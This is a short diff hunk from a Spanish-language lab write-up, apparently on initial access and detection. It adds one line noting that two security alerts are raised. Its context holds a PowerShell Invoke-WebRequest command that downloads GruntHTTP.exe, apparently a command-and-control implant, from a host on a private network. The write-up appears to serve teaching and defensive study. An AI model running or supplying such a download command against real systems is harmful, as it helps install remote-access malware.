@@ -103,6 +103,7 @@ Para descargar el fichero utilize la expresión:
 
 Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
 
+Se nos generan dos alertas
 
 ![image008.png](/uploads/InitialAccess/image008.png)
 
